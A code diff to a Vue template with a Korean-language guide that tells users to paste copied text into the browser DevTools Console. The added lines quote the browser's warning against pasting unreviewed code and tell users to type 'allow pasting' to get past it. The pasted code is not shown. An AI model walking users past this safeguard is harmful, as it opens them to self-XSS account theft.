@@ -8,6 +8,8 @@
     <p>3. 빨간색 동그라미친 부분에 있는 Console 버튼을 누른다. 한글로는 콘솔일 거다.</p>
     <img src="@/assets/images/guide3.png" />
     <p>4. 아까 복사한 텍스트를 붙여넣고 엔터를 누르면 끝</p>
+    <p>만약 Warning: Don’t paste code into the DevTools Console that you don’t understand or haven’t reviewed yourself. This could allow attackers to steal your identity or take control of your computer. Please type ‘allow pasting’ below to allow pasting.</p>
+    <p>위 메세지가 뜬다면 붙여넣기 하기 전에 allow pasting이라고 한 번 입력해주세요</p>
   </div>
 </template>
 
